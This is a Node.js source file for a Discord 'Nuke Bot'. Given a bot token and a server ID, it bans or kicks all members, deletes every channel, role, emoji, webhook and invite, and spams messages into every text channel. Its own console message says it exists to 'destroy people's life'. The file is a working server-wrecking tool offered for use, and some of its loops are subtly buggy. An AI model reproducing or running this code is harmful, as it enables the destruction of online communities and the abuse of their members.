const Discord = require("discord.js");
const prompt = require("prompt-sync")({ sigint: true });
const chalk = require("chalk");
const { sleep } = require("visa2discord");
console.log(chalk.yellow("Please enter the bot token:"));
const token = prompt(chalk.cyan("> "));
const client = new Discord.Client({
  intents: [
    Discord.GatewayIntentBits.Guilds,
    Discord.GatewayIntentBits.GuildMembers,
    Discord.GatewayIntentBits.GuildIntegrations,
    Discord.GatewayIntentBits.GuildVoiceStates,
    Discord.GatewayIntentBits.MessageContent,
    Discord.GatewayIntentBits.GuildMessages,
  ],
});
process.on("unhandledRejection", (error) => {
  console.log(chalk.red("An error occurred:"));
  if (error.message === "Used disallowed intents") {
    console.log(
      chalk.red(
        "The bot needs the following intents to work:\n- MESSAGE CONTENT INTENT\n- SERVER MEMBERS INTENT"
      )
    );
  } else {
    console.log(chalk.red(error.message));
  }
  process.exit(1);
});

client.login(token).catch((err) => {
  console.log(chalk.red("An error occurred while logging in:"));
  console.log(err);
  console.log(chalk.red("Invalid token"));
  process.exit(1);
});

client.on("ready", () => {
  console.log(
    chalk.green(
      "The Nuke Bot is now ready and online to destroy people's life :))"
    )
  );
  ask();
});

async function ask() {
  console.log(
    chalk.yellow(
      "What do you want to do? \n1. Ban all members \n2. Kick all members \n3. Delete all channels \n4. Delete all roles \n5. Delete all emojis \n6. Delete all webhooks \n7. Delete all invites \n8. Spam A message \n9. DO all \n10. Exit"
    )
  );
  const ask = prompt(chalk.cyan("> "));
  const guildId = prompt(chalk.yellow("Please enter the guild ID: "));
  const delay = prompt(
    chalk.yellow("Please enter the delay (in milliseconds): ")
  );
  if (isNaN(delay)) {
    console.log(chalk.red("Delay should be number"));
    process.exit(1);
  }
  const guild = await client.guilds.fetch(guildId).catch((err) => {
    console.log(chalk.red("Invalid guild ID"));
    process.exit(1);
  });
  if (!guild) {
    console.log(chalk.red("Invalid guild ID"));
    process.exit(1);
  }
  switch (ask) {
    case "1":
      banAll(guild, delay);
      break;
    case "2":
      kickAll(guild), delay;
      break;
    case "3":
      deleteAllChannels(guild, delay);
      break;
    case "4":
      deleteAllRoles(guild, delay);
      break;
    case "5":
      deleteAllEmojis(guild, delay);
      break;
    case "6":
      deleteAllWebhooks(guild, delay);
      break;
    case "7":
      deleteAllInvites(guild, delay);
      break;
    case "8":
      const message = prompt(
        chalk.yellow("Please enter the message to spam: ")
      );
      spamMessage(guild, delay, message);
      break;
    case "9":
      banAll(guild, delay);
      kickAll(guild, delay);
      deleteAllChannels(guild, delay);
      deleteAllRoles(guild, delay);
      deleteAllEmojis(guild, delay);
      deleteAllWebhooks(guild, delay);
      deleteAllInvites(guild, delay);
      break;
    case "10":
      process.exit(1);
  }
}

async function banAll(guild, delay) {
  let i = 0;
  const count = guild.memberCount;
  for (const member of guild.members.cache) {
    if (member.bannable) {
      await sleep(delay);
      member.ban();
      i++;
    }
  }
  console.log(chalk.green(`Banned ${i} members out of ${count} members`));
  ask();
}

async function kickAll(guild, delay) {
  let i = 0;
  const count = guild.memberCount;
  for (const member of guild.members.cache) {
    if (member.kickable) {
      await sleep(delay);

      member.kick();
      i++;
    }
  }
  console.log(chalk.green(`Kicked ${i} members out of ${count} members`));
  ask();
}

async function deleteAllChannels(guild, delay) {
  let i = 0;
  const count = guild.channels.cache.size;
  for (const channel of guild.channels.cache) {
    await sleep(delay);

    try {
      channel[1].delete();
      i++;
    } catch {}
  }
  console.log(chalk.green(`Deleted ${i} channels out of ${count} channels`));
}

async function deleteAllRoles(guild, delay) {
  let i = 0;
  const count = guild.roles.cache.size;
  for (const role of guild.roles.cache) {
    await sleep(delay);

    try {
      role[1].delete();
      i++;
    } catch {}
  }
  console.log(chalk.green(`Deleted ${i} roles out of ${count} roles`));
  ask();
}

async function deleteAllEmojis(guild, delay) {
  let i = 0;
  const count = guild.emojis.cache.size;
  for (const emoji of guild.emojis.cache) {
    await sleep(delay);

    try {
      emoji[1].delete();
      i++;
    } catch {}
  }
  console.log(chalk.green(`Deleted ${i} emojis out of ${count} emojis`));
  ask();
}

async function deleteAllWebhooks(guild, delay) {
  let i = 0;
  for (const webhook of guild.webhooks.cache) {
    await sleep(delay);

    try {
      webhook[1].delete();
      i++;
    } catch {}
  }
  console.log(
    chalk.green(
      `Deleted ${i} webhooks out of ${guild.webhooks.cache.size} webhooks`
    )
  );
  ask();
}

async function deleteAllInvites(guild, delay) {
  let i = 0;
  const count = guild.invites.cache.size;
  for (const invite of guild.invites.cache) {
    await sleep(delay);

    try {
      invite[1].delete();
      i++;
    } catch {}
  }
  console.log(chalk.green(`Deleted ${i} invites out of ${count} invites`));
  ask();
}

async function spamMessage(guild, delay, message) {
  const times = prompt(
    chalk.yellow("Please enter the number of times to spam: ")
  );
  if (isNaN(times)) {
    console.log(chalk.red("Times should be number"));
    process.exit(1);
  }
  let i = 0;
  for (i = 0; i < times; i++) {
    await sleep(delay);
    guild.channels.cache.forEach((channel) => {
      if (channel.type === Discord.ChannelType.GuildText) {
        channel.send({ content: message });
      }
    });
  }
  ask();
}
